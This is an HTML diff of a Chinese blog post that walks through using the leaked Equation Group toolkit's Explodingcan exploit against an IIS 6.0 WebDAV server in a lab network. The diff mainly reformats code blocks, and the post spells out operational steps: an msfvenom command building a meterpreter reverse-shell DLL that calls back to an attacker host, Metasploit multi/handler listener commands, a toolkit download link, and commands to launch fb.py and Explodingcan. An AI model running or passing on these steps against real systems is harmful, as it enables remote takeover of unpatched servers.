@@ -18,10 +18,13 @@
 <meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg">
 <meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg">
 <meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg">
+<meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg">
+<meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg">
+<meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/1.jpg">
 <meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/2.jpg">
 <meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/3.jpg">
 <meta property="og:image" content="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/4.jpg">
-<meta property="og:updated_time" content="2017-12-01T15:36:10.685Z">
+<meta property="og:updated_time" content="2017-12-02T09:27:03.399Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NSA工具包windows 0day验证之IIS6.0漏洞利用">
 <meta name="twitter:description" content="验证环境：攻击机1(本次演示IP：172.16.11.2)：windows系统，安装python2.6.6, pywin32-221.win32-py2.6.exe, xshell, xftp, 下载方程式工具包放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之 攻击机2(本次演示IP：172.16.12.2)：k">
@@ -184,14 +187,13 @@
         <h3 id="验证环境："><a href="#验证环境：" class="headerlink" title="验证环境："></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">安装python2.6.6</a>, <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master" target="_blank" rel="noopener">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p>
 <p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p>
 <p>目标机1(本次演示IP：172.16.12.3)：开放了80端口的Windows Server 2003 R2，IIS6.0，开启了Webdav功能</p>
-<p>以上所有IP之间均可以直接访问</p>
-<h3 id="验证步骤："><a href="#验证步骤：" class="headerlink" title="验证步骤："></a>验证步骤：</h3><a id="more"></a>
-<hr>
+<p>以上所有IP之间均可以直接访问<br><a id="more"></a></p>
+<h3 id="验证步骤："><a href="#验证步骤：" class="headerlink" title="验证步骤："></a>验证步骤：</h3><hr>
 <h4 id="第一步：生成可执行的恶意dll文件"><a href="#第一步：生成可执行的恶意dll文件" class="headerlink" title="第一步：生成可执行的恶意dll文件"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01</p>
 <p>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：</p>
 <p><img src="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg" alt="1.jpg" title="1.jpg"></p>
 <p>0x02</p>
-<p>执行命令：<code>&lt;span class=&quot;hljs-attribute&quot;&gt;msfvenom&lt;/span&gt; -p windows/meterpreter/reverse_tcp LHOST=&lt;span class=&quot;hljs-number&quot;&gt;172.16.12.2&lt;/span&gt; LPORT=&lt;span class=&quot;hljs-number&quot;&gt;5555&lt;/span&gt; -f dll &amp;gt;s.dll</code></p>
+<p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll &gt;s.dll</span><br></pre></td></tr></table></figure></p>
 <p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell</p>
 <p>0x03</p>
 <p>点击xshell如图位置</p>
@@ -200,41 +202,21 @@
 <p><img src="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg" alt="4.jpg" title="4.jpg"></p>
 <h4 id="第二步：配置kali使得kali处于监听状态"><a href="#第二步：配置kali使得kali处于监听状态" class="headerlink" title="第二步：配置kali使得kali处于监听状态"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01</p>
 <p>依次输入命令</p>
-<pre><code>msfconsole
-use exploit&lt;span class=&quot;prism-token prism-operator&quot;&gt;/&lt;/span&gt;multi&lt;span class=&quot;prism-token prism-operator&quot;&gt;/&lt;/span&gt;handler
-&lt;span class=&quot;prism-token prism-keyword&quot;&gt;set&lt;/span&gt; lhost &lt;span class=&quot;prism-token prism-number&quot;&gt;172.16&lt;/span&gt;&lt;span class=&quot;prism-token prism-punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;prism-token prism-number&quot;&gt;12.2&lt;/span&gt;
-&lt;span class=&quot;prism-token prism-keyword&quot;&gt;set&lt;/span&gt; lport &lt;span class=&quot;prism-token prism-number&quot;&gt;5555&lt;/span&gt;
-&lt;span class=&quot;prism-token prism-keyword&quot;&gt;set&lt;/span&gt; PAYLOAD windows&lt;span class=&quot;prism-token prism-operator&quot;&gt;/&lt;/span&gt;meterpreter&lt;span class=&quot;prism-token prism-operator&quot;&gt;/&lt;/span&gt;reverse_tcp
-exploit`&lt;/pre&gt;
-看到如图即说明配置成功
-
-![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg &quot;2.jpg&quot;)
-
-这时就可以将xshell最小化，等后边再用
-
-#### 第三步：使用方程式工具包进行攻击
-
-0x01
-
-将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为&quot;listeningposts&quot;的文件夹，如图，不然运行会报错
-
-![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg &quot;5.jpg&quot;)
-
-0x02
-
-打开命令提示符，输入
-&lt;pre class=&quot;prism-highlight prism- prism-line-numbers language-actionscript&quot; data-language=&quot;ActionScript&quot;&gt;`C&lt;span class=&quot;prism-token prism-punctuation&quot;&gt;:&lt;/span&gt;\win\fb&lt;span class=&quot;prism-token prism-punctuation&quot;&gt;.&lt;/span&gt;py`&lt;/pre&gt;
-然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图
-
-![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/1.jpg &quot;1.jpg&quot;)
-
-最后敲击回车
-
-0x03
-
-显示出&quot;fb &amp;gt;&quot;之后输入命令
-&lt;pre class=&quot;prism-highlight prism- prism-line-numbers language-typescript&quot; data-language=&quot;TypeScript&quot;&gt;`use Explodingcan
-</code></pre><p>使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 172.16.12.2</span><br><span class="line">set lport 5555</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>看到如图即说明配置成功</p>
+<p><img src="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg" alt="2.jpg" title="2.jpg"></p>
+<p>这时就可以将xshell最小化，等后边再用</p>
+<h4 id="第三步：使用方程式工具包进行攻击"><a href="#第三步：使用方程式工具包进行攻击" class="headerlink" title="第三步：使用方程式工具包进行攻击"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01</p>
+<p>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错</p>
+<p><img src="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg" alt="5.jpg" title="5.jpg"></p>
+<p>0x02</p>
+<p>打开命令提示符，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\win\fb.py</span><br></pre></td></tr></table></figure></p>
+<p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图</p>
+<p><img src="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/1.jpg" alt="1.jpg" title="1.jpg"></p>
+<p>最后敲击回车</p>
+<p>0x03</p>
+<p>显示出<code>fb &gt;</code>之后输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Explodingcan</span><br></pre></td></tr></table></figure></p>
+<p>使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可</p>
 <p><img src="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/2.jpg" alt="" title="2.jpg"></p>
 <p>（选择系统，CallbackIP、CallbackPort等，端口可以任意设置）</p>
 <p><img src="https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/3.jpg" alt="" title="3.jpg"></p>
